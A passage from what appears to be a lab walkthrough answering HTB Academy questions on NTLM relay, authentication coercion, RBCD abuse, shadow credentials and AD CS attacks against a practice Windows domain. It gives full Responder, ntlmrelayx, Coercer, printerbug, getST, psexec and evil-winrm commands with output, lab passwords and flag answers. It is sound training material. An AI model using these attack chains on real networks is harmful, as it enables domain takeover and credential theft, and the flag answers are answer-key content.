    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4-blackhat-edition
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[info] Starting scan mode
[info] Scanning target 172.16.117.60
<SNIP>
```

Right after students have started `Coercer` in `scan` mode, after a few seconds, SMB-named pipes will be discovered and marked as `accessible`.

```
<SNIP>
[info] Scanning target 172.16.117.60
[+] SMB named pipe '\PIPE\eventlog' is accessible!
   [+] Successful bind to interface (82273fdc-e32a-18c3-3f78-827929dc23ea, 0.0)!
[+] SMB named pipe '\PIPE\lsarpc' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
```

Answer: `\PIPE\lsarpc`

# Authentication Coercion

## Question 2

### "Use Coercer in 'coerce' mode against 172.16.117.60 and submit the name of the first RPC call resulting in the message '\[+\] (ERROR\_BAD\_NETPATH)' for the SMB named pipe '\\PIPE\\lsass'."

Students will reuse the previously established SSH session. They will change their current working directory to `tools/Responder`:

Code: shell

```shell
cd tools/Responder
```

```
htb-student@ubuntu:~$ cd tools/Responder
htb-student@ubuntu:~/tools/Responder$ 
```

They will have to turn off the SMB Server and HTTP Server, usually started by `Responder` by altering the configuration in the `Responder.conf` file located in the same directory. This is done to allow the relayed authentication to go to `ntlmrelayx`:

Code: shell

```shell
sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" Responder.conf
cat Responder.conf | grep -ie "SMB =\|HTTP ="
```

```
htb-student@ubuntu:~/tools/Responder$ sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" Responder.conf
htb-student@ubuntu:~/tools/Responder$ cat Responder.conf | grep -ie "SMB =\|HTTP ="
SMB = Off
HTTP = Off
```

Right after, students need to start `Responder` with `sudo` in "poisoning" mode by only specifying the `-I` parameter for the interface (`ens192`). Configuring the tool to poison every broadcast request/traffic.

Code: shell

```shell
sudo python3 Responder.py -I ens192
```

```
htb-student@ubuntu:~/tools/Responder$ sudo python3 Responder.py -I ens192
<SNIP>

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

<SNIP>

[+] Generic Options:
    Responder NIC              [ens192]
    Responder IP               [172.16.117.30]
    Responder IPv6             [fe80::250:56ff:feb9:80f3]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-6Y3FH7UTIW2]
    Responder Domain Name      [0RAB.LOCAL]
    Responder DCE-RPC Port     [45567]

[+] Listening for events...
```

Right after students have started `Responder`, they will have to establish a second SSH session to the spawned target. In the second SSH session, students will have to create a target file containing the host `172.16.117.3` while specifying `ldap://` as a protocol.

Code: shell

```shell
echo "ldap://172.16.117.3" > target.txt
cat target.txt
```

```
htb-student@ubuntu:~$ echo "ldap://172.16.117.3" > target.txt
htb-student@ubuntu:~$ cat target.txt 
ldap://172.16.117.3
```

Once they have created the `target.txt` file containing the host, students will have to start `ntlmrelayx` as the `root` user or use `sudo`, with the `-tf` target file option, and specifying the `target.txt` file, `-smb2support` option providing `SMBv2` support for hosts that are requiring it, `--no-da` option to not attempt to add a Domain Admin, `--no-acl` option to disable ACL attacks, and the `--add-computer` option followed by a computer name of choice.

Code: shell

```shell
sudo ntlmrelayx.py -tf target.txt -smb2support --no-da --no-acl --add-computer "Academy-Student"
```

```
htb-student@ubuntu:~$ sudo ntlmrelayx.py -tf target.txt -smb2support --no-da --no-acl --add-computer "Academy-Student"
[sudo] password for htb-student: 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

After a while, students will notice that a relayed authentication was able to create a fake computer on the domain controller named `Academy-Student$` with a randomly generated password.

```
htb-student@ubuntu:~$ sudo ntlmrelayx.py -tf target.txt -smb2support --no-da --no-acl --add-computer "Academy-Student"
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<SNIP>
[*] Attempting to create computer in: CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] Adding new computer with username: Academy-Student$ and password: >ld/b:k4ie{T7i0 result: OK
```

Once the fake computer has been created/added, students can terminate the `ntlmrelayx` process. Right after they will have to utilize `Coercer` in `coerce` mode with the credentials of the fake computer, utilizing the `-t` target host (`172.16.117.30`), the `-l` for the listening host (`172.16.117.30`), and the `--always-continue` option.

Code: shell

```shell
Coercer coerce -t 172.16.117.60 -u 'Academy-Student$' -p '>ld/b:k4ie{T7i0' --always-continue -l 172.16.117.30
```

```
htb-student@ubuntu:~$ Coercer coerce -t 172.16.117.60 -u 'Academy-Student$' -p '>ld/b:k4ie{T7i0' --always-continue -l 172.16.117.30
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4-blackhat-edition
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[info] Starting coerce mode
[info] Scanning target 172.16.117.60
<SNIP>
```

Once students have initiated the coercion, they will come to see the output containing the named pipes and RPC calls used.

```
htb-student@ubuntu:~$ Coercer coerce -t 172.16.117.60 -u 'Academy-Student$' -p '>ld/b:k4ie{T7i0' --always-continue -l 172.16.117.30
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4-blackhat-edition
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[info] Starting coerce mode
[info] Scanning target 172.16.117.60
<SNIP>
[+] SMB named pipe '\PIPE\lsass' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\kIor1apS\file.txt\x00') 
<SNIP>
```

Answer: `EfsRpcDecryptFileSrv`

# Advanced NTLM Relay Attacks Targeting Kerberos

## Question 1

### "Use the '.searchConnector-ms' file technique to force computers connecting to the shared folder '\\\\DC01\\Testing' to enable WebDav. After waiting a couple of minutes, submit the computer's IP address that got WebDav enabled."

After spawning the target machine, students will connect via SSH with the provided credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[eu-academy-1]─[10.10.14.196]─[htb-ac-8414@htb-7admwdxcua]─[~]
└──╼ [★]$ ssh htb-student@10.129.100.121
The authenticity of host '10.129.100.121 (10.129.100.121)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.100.121' (ECDSA) to the list of known hosts.
htb-student@10.129.100.121's password: HTB_@cademy_stdnt!
<SNIP>
  
Last login: Wed Aug 30 16:24:31 2023 from 10.10.14.33 
htb-student@ubuntu:~$
```

Once students have successfully connected via SSH, they will have to utilize `CrackMapExec` and its `webdav` module to enumerate the hosts for WebDav.

Code: shell

```shell
crackmapexec smb 172.16.117.0/24 -u anonymous -p '' -M webdav
```

```
htb-student@ubuntu:~$ crackmapexec smb 172.16.117.0/24 -u anonymous -p '' -M webdav

SMB         172.16.117.60   445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.117.50   445    WS01             [*] Windows 10.0 Build 17763 x64 (name:WS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.60   445    SQL01            [+] INLANEFREIGHT.LOCAL\anonymous: 
SMB         172.16.117.3    445    DC01             [+] INLANEFREIGHT.LOCAL\anonymous: 
SMB         172.16.117.50   445    WS01             [+] INLANEFREIGHT.LOCAL\anonymous: 
Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Students will learn that none of the hosts in the `172.16.117.0/24` subnet has WebDav enabled. For them to enable `WebDav` they will utilize `CrackMapExec` and its `drop-sc` module that is used to remotely coerce a host to start the WebClient service, using its options - `SHARE` option used to target a specific share that a user has `READ` / `WRITE` access to, the `FILENAME` option to specify the name of the file to be generated, and the `URL` option to specify the URL used in the searchConnector-ms file. Students will have to target the Domain Controller (`172.16.117.3`) and the `Testing` share, where they have anonymous `READ` / `WRITE` access.

Code: shell

```shell
crackmapexec smb 172.16.117.3 -u anonymous -p '' -M drop-sc -o URL=https://172.16.117.30/testing FILENAME=@secret SHARE=Testing
```

```
htb-student@ubuntu:~$ crackmapexec smb 172.16.117.3 -u anonymous -p '' -M drop-sc -o URL=https://172.16.117.30/testing FILENAME=@secret SHARE=Testing

[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.117.3    445    DC01             [+] INLANEFREIGHT.LOCAL\anonymous: 
DROP-SC     172.16.117.3    445    DC01             [+] Found writable share: Testing
DROP-SC     172.16.117.3    445    DC01             [+] [OPSEC] Created @secret.searchConnector-ms file on the Testing share
```

Once they have successfully placed the searchConnector-ms file, students will have to wait for a few minutes. Then after a few minutes, once enumerating the WebClient service using the WebDAV module in `CrackMapExec`, students will learn that the service got enabled on `172.16.117.60`.

Code: shell

```shell
crackmapexec smb 172.16.117.0/24 -u anonymous -p '' -M webdav
```

```
htb-student@ubuntu:~$ crackmapexec smb 172.16.117.0/24 -u anonymous -p '' -M webdav

SMB         172.16.117.60   445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.117.50   445    WS01             [*] Windows 10.0 Build 17763 x64 (name:WS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.60   445    SQL01            [+] INLANEFREIGHT.LOCAL\anonymous: 
WEBDAV      172.16.117.60   445    SQL01            WebClient Service enabled on: 172.16.117.60
SMB         172.16.117.3    445    DC01             [+] INLANEFREIGHT.LOCAL\anonymous: 
SMB         172.16.117.50   445    WS01             [+] INLANEFREIGHT.LOCAL\anonymous: 
Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Answer: `172.16.117.60`

# Advanced NTLM Relay Attacks Targeting Kerberos

## Question 2

### "Coerce the computer that got WebDav enabled into performing HTTP NTLM authentication and then abuse RBCD to delegate a computer account to authenticate to it. Impersonate the Administrator account and submit the file's contents at 'C:\\Users\\Administrator\\Desktop\\flag.txt'."

Utilizing the previously spawned target and SSH session, students need to change their working directory to `tools/Responder`:

Code: shell

```shell
cd tools/Responder
```

```
htb-student@ubuntu:~$ cd tools/Responder/
```

They will have to turn off the SMB Server and HTTP Server, usually started by `Responder`, by altering the line in the `Responder.conf` configuration file in the same directory. This is done to allow the relayed authentication to go to `ntlmrelayx`.

Code: shell

```shell
sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" Responder.conf
cat Responder.conf | grep -ie "SMB =\|HTTP ="
```

```
htb-student@ubuntu:~/tools/Responder$ sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" Responder.conf
htb-student@ubuntu:~/tools/Responder$ cat Responder.conf | grep -ie "SMB =\|HTTP ="
SMB = Off
HTTP = Off
```

Right after, students need to start `Responder` using `sudo` in "poisoning" mode by only specifying the `-I` parameter for the interface (`ens192`), configuring the tool to poison every broadcast request/traffic.

Code: shell

```shell
sudo python3 Responder.py -I ens192
```

```
htb-student@ubuntu:~/tools/Responder$ sudo python3 Responder.py -I ens192
<SNIP>

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

<SNIP>

[+] Generic Options:
    Responder NIC              [ens192]
    Responder IP               [172.16.117.30]
    Responder IPv6             [fe80::250:56ff:feb9:80f3]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-6Y3FH7UTIW2]
    Responder Domain Name      [0RAB.LOCAL]
    Responder DCE-RPC Port     [45567]

[+] Listening for events...
```

After students start `Responder`, they will have to establish a second SSH session to the spawned target. In the second SSH session, students will have to create a target file containing the `172.16.117.3` host.

Code: shell

```shell
echo "ldap://172.16.117.3" > target.txt
cat target.txt
```

```
htb-student@ubuntu:~$ echo "ldap://172.16.117.3" > target.txt
htb-student@ubuntu:~$ cat target.txt 
ldap://172.16.117.3
```

Once they have created the `target.txt` file containing the host, students will have to start `ntlmrelayx` as the `root` user or use `sudo`, with the `-tf` target file option and specifying the `target.txt` file, `-smb2support` option providing `SMBv2` support for hosts that are requiring it, `--no-da` option not attempting to add a Domain Admin, `--no-acl` option to disable ACL attacks, and the `--add-computer` option followed by a computer name of choice.

Code: shell

```shell
sudo ntlmrelayx.py -tf target.txt -smb2support --no-da --no-acl --add-computer "Academy-Student"
```

```
htb-student@ubuntu:~$ sudo ntlmrelayx.py -tf target.txt -smb2support --no-da --no-acl --add-computer "Academy-Student"
[sudo] password for htb-student: 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

After a while, students will notice that a relayed authentication created a fake computer on the domain controller named `Academy-Student$` with a randomly generated password.

```
htb-student@ubuntu:~$ sudo ntlmrelayx.py -tf target.txt -smb2support --no-da --no-acl --add-computer "Academy-Student"
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<SNIP>
[*] Attempting to create computer in: CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] Adding new computer with username: Academy-Student$ and password: >ld/b:k4ie{T7i0 result: OK
```

Subsequently, after students have added a new fake computer to the domain, they will have to terminate the current session of `ntlmrelayx`. Once terminated, students need to start a new `ntlmrelayx` relay targeting `ldaps://INLANEFREIGHT\\'SQL01$'@172.16.117.3` the machine account of the host `SQL01`, with the options: `--delegate-access` option delegating access on the relayed computer account to the specified account, the `--escalate-user` option escalating privileges of the selected user instead of creating a new one, the `--no-smb-server` option disabling the SMB server, and the `--no-dump` option to prevent the attempt of dumping LDAP information about the domain.

Code: shell

```shell
sudo ntlmrelayx.py -t ldaps://INLANEFREIGHT\\'SQL01$'@172.16.117.3 --delegate-access --escalate-user 'Academy-Student$' --no-smb-server --no-dump
```

```
htb-student@ubuntu:~$ sudo ntlmrelayx.py -t ldaps://INLANEFREIGHT\\'SQL01$'@172.16.117.3 --delegate-access --escalate-user 'Academy-Student$' --no-smb-server --no-dump
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to single host
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server

[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
```

Right after the students have started `ntlmrelayx` and are waiting for authentication to be relayed, they will have to spawn another SSH session to the spawned target, where they will utilize `printerbug.py` located at `tools/krbrelayx/`. Using the mentioned tool, students will have to coerce an authentication using the generated credentials for the computer they have added previously, while simultaneously specifying the host listener.

Code: shell

```shell
cd tools/krbrelayx
python3 printerbug.py inlanefreight.local/Academy-Student$:'5l}2/.dQifU><dO'@172.16.117.60 LINUX01@80/print
```

```
htb-student@ubuntu:~$ cd tools/krbrelayx/
htb-student@ubuntu:~/tools/krbrelayx$ python3 printerbug.py inlanefreight.local/Academy-Student$:'5l}2/.dQifU><dO'@172.16.117.60 LINUX01@80/print

[*] Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Attempting to trigger authentication via rprn RPC at 172.16.117.60
[*] Bind OK
[*] Got handle
RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
[*] Triggered RPC backconnect, this may or may not have worked
```

Subsequently, students will come to know that the coerced authentication was successful and relayed, and the attack has succeeded as `Academy-Student$` can now impersonate users on `SQL01$` via `S4UProxy`.

Code: shell

```shell
sudo ntlmrelayx.py -t ldaps://INLANEFREIGHT\\'SQL01$'@172.16.117.3 --delegate-access --escalate-user 'Academy-Student$' --no-smb-server --no-dump
```

```
htb-student@ubuntu:~$ sudo ntlmrelayx.py -t ldaps://INLANEFREIGHT\\'SQL01$'@172.16.117.3 --delegate-access --escalate-user 'Academy-Student$' --no-smb-server --no-dump
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to single host
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server

[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
<SNIP>
[*] HTTPD(80): Connection from INLANEFREIGHT/SQL01$@172.16.117.60 controlled, attacking target [ldaps://INLANEFREIGHT](ldaps://INLANEFREIGHT)\SQL01$@172.16.117.3
[*] HTTPD(80): Authenticating against [ldaps://INLANEFREIGHT](ldaps://INLANEFREIGHT)\SQL01$@172.16.117.3 as INLANEFREIGHT/SQL01$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] All targets processed!
[*] HTTPD(80): Connection from INLANEFREIGHT/SQL01$@172.16.117.60 controlled, but there are no more targets left!
[*] Delegation rights modified succesfully!
[*] Academy-Student$ can now impersonate users on SQL01$ via S4U2Proxy
```

Students can terminate the `ntlmrelayx` process. Right after they have terminated it, students will have to utilize `getST.py` part of Impacket to request a silver ticket as an Administrator while specifying the `CIFS` service SPN using the credentials of the computer they have previously created.

Code: shell

```shell
getST.py -spn cifs/sql01.inlanefreight.local -impersonate Administrator -dc-ip 172.16.117.3 "INLANEFREIGHT"/"Academy-Student$":"5l}2/.dQifU><dO"
```

```
htb-student@ubuntu:~$ getST.py -spn cifs/sql01.inlanefreight.local -impersonate Administrator -dc-ip 172.16.117.3 "INLANEFREIGHT"/"Academy-Student$":"5l}2/.dQifU><dO"
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

Once students have executed the command successfully an Administrator ticket will be generated, which can be used to access resources via `psexec` and its `-k` option to use Kerberos, the `-no-pass` option to specify that no password will be used on the `SQL01` machine. And, the `KRB5CCNAME` attribute to specify the Administrator's ccache file.

Code: shell

```shell
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass sql01.inlanefreight.local
type C:\Users\Administrator\Desktop\flag.txt
```

```
htb-student@ubuntu:~$ KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass sql01.inlanefreight.local
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on sql01.inlanefreight.local.....
[*] Found writable share ADMIN$
[*] Uploading file fcyZJGNw.exe
[*] Opening SVCManager on sql01.inlanefreight.local.....
[*] Creating service FZLp on sql01.inlanefreight.local.....
[*] Starting service FZLp.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
RBCD_Using_NTLMRelay
```

Answer: `RBCD_Using_NTLMRelay`

# Advanced NTLM Relay Attacks Targeting Kerberos

## Question 3

### "Relay CJAQ's HTTP NTLM authentication over LDAP to create shadow credentials for JPEREZ. Then, connect to the DC (172.16.117.3) as JPEREZ and submit the file's contents at 'C:\\Users\\jperez\\Desktop\\flag.txt'."

Students will reuse `Responder` and perform the `Shadow Credentials` attack, utilizing the previously spawned target, SSH session, and configuration.

Subsequently, students will have to start `ntlmrelayx` in the other SSH session, specifying the target using the `-t` option (including the `DOMAIN\Username`), the `--shadow-credentials` that enables Shadow Credentials relay attack, `--shadow-target` option to target the (user or computer) to populate the `msDS-KeyCredentialLink` attribute, `--no-da` option to not attempt to add a Domain Admin, `--no-dump` option preventing dumping the LDAP information, `--no-acl` to disable ACL attacks.

Code: shell

```shell
sudo ntlmrelayx.py -t ldap://INLANEFREIGHT\\CJAQ@172.16.117.3 --shadow-credentials --shadow-target jperez --no-da --no-dump --no-acl
```

```
htb-student@ubuntu:~$ sudo ntlmrelayx.py -t ldap://INLANEFREIGHT\\CJAQ@172.16.117.3 --shadow-credentials --shadow-target jperez --no-da --no-dump --no-acl
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server

[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
<SNIP>
```

After a while, students will realize that the shadow credentials attack was successful and an additional `.pfx` file has been generated in their current working directory.

```
htb-student@ubuntu:~$ sudo ntlmrelayx.py -t ldap://INLANEFREIGHT\\CJAQ@172.16.117.3 --shadow-credentials --shadow-target jperez --no-da --no-dump --no-acl
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<SNIP>
[*] HTTPD(80): Authenticating against [ldap://INLANEFREIGHT\CJAQ@172.16.117.3](ldap://INLANEFREIGHT\CJAQ@172.16.117.3) as INLANEFREIGHT/CJAQ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] All targets processed!
[*] HTTPD(80): Connection from INLANEFREIGHT/CJAQ@172.16.117.60 controlled, but there are no more targets left!
[*] Searching for the target account
[*] Target user found: CN=Jeffry Perez,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 31f18140-4d7e-37b5-4e87-42d038c1206c
[*] Updating the msDS-KeyCredentialLink attribute of jperez
[*] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saved PFX (#PKCS12) certificate & key at path: 5qnZ3xel.pfx
[*] Must be used with password: f4OQrGgvd51S0MFatOO4
[*] A TGT can now be obtained with [https://github.com/dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)
[*] Run the following command to obtain a TGT
[*] python3 PKINITtools/gettgtpkinit.py -cert-pfx 5qnZ3xel.pfx -pfx-pass f4OQrGgvd51S0MFatOO4 INLANEFREIGHT.LOCAL/jperez 5qnZ3xel.ccache
```

Students can terminate the `ntlmrelayx` process. Once terminated, students will have to use `gettgtpkinit.py` located at `tools/PKINITtools` alongside the generated `.pfx` and its generated password:

Code: shell

```shell
python3 tools/PKINITtools/gettgtpkinit.py -cert-pfx 5qnZ3xel.pfx -pfx-pass f4OQrGgvd51S0MFatOO4 INLANEFREIGHT.LOCAL/jperez jperez.ccache
```

```
htb-student@ubuntu:~$ python3 tools/PKINITtools/gettgtpkinit.py -cert-pfx 5qnZ3xel.pfx -pfx-pass f4OQrGgvd51S0MFatOO4 INLANEFREIGHT.LOCAL/jperez jperez.ccache
2023-09-07 11:39:57,766 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2023-09-07 11:39:57,792 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2023-09-07 11:40:17,135 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2023-09-07 11:40:17,135 minikerberos INFO     e02079185899255e2594b89f377427cf677ce0c7b2b6a5f99c731ea86b754e57
INFO:minikerberos:e02079185899255e2594b89f377427cf677ce0c7b2b6a5f99c731ea86b754e57
2023-09-07 11:40:17,146 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Subsequently, students will come to know that a `ccache` has been generated and can be used to authenticate using `evil-winrm` to `DC01` with the `KRB5CCNAME` attribute.

Code: shell

```shell
KRB5CCNAME=jperez.ccache evil-winrm -i dc01.inlanefreight.local -r INLANEFREIGHT.LOCAL
type C:\Users\jperez\Desktop\flag.txt
```

```
htb-student@ubuntu:~$ KRB5CCNAME=jperez.ccache evil-winrm -i dc01.inlanefreight.local -r INLANEFREIGHT.LOCAL
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jperez\Documents> type C:\Users\jperez\Desktop\flag.txt

Shadow_Cr3dent1als_4ttcks
```

Answer: `Shadow_Cr3dent1als_4ttcks`

# Advanced NTLM Relay Attacks Targeting AD CS

## Question 1

### "Abuse ESC8 or ESC11 to compromise WS01 (172.16.117.50) and then submit the file's contents located at 'C:\\Users\\Administrator\\Desktop\\flag.txt'."

Students need to spawn the target machine, they will have to use SSH to access the target machine with the provided credentials `htb-student:HTB_@cademy_stdnt!`. Students will have to note that they will need to either establish two SSH connections to the spawned target machine, use `tmux`, or connect to the target via `RDP`. This is due to the fact that they will utilize two tools `Responder` , `certipy`, and `printerbug.py`, and since those tools take over the stdin while they are running.

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[eu-academy-1]─[10.10.14.196]─[htb-ac-8414@htb-7admwdxcua]─[~]
└──╼ [★]$ ssh htb-student@10.129.100.121
The authenticity of host '10.129.100.121 (10.129.100.121)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.100.121' (ECDSA) to the list of known hosts.
htb-student@10.129.100.121's password: HTB_@cademy_stdnt!
<SNIP>
  
Last login: Wed Aug 30 16:24:31 2023 from 10.10.14.33 
htb-student@ubuntu:~$
```

Subsequently, students need to change their working directory to `tools/Responder`. They will have to turn off the SMB Server and HTTP Server, usually started by `Responder`, by altering the line in the `Responder.conf` configuration file in the same directory. This is done to allow the relayed authentication to go to `ntlmrelayx`.

Code: shell

```shell
cd tools/Responder
sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" Responder.conf
cat Responder.conf | grep -ie "SMB =\|HTTP ="
```

```
htb-student@ubuntu:~$ cd tools/Responder
htb-student@ubuntu:~/tools/Responder$ sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" Responder.conf
htb-student@ubuntu:~/tools/Responder$ cat Responder.conf | grep -ie "SMB =\|HTTP ="
SMB = Off
HTTP = Off
```

Right after, students need to start `Responder` using `sudo` in "poisoning" mode by only specifying the `-I` parameter for the interface (`ens192`). Configuring the tool to poison every broadcast request/traffic.

Code: shell

```shell
sudo python3 Responder.py -I ens192
```

```
htb-student@ubuntu:~/tools/Responder$ sudo python3 Responder.py -I ens192
<SNIP>

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

<SNIP>

[+] Generic Options:
    Responder NIC              [ens192]
    Responder IP               [172.16.117.30]
    Responder IPv6             [fe80::250:56ff:feb9:80f3]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-6Y3FH7UTIW2]
    Responder Domain Name      [0RAB.LOCAL]
    Responder DCE-RPC Port     [45567]

[+] Listening for events...
```

Right after students have started `Responder`, they will have to establish a second SSH session to the spawned target. In the second SSH session, students will have to create a target file containing the `172.16.117.3` host.

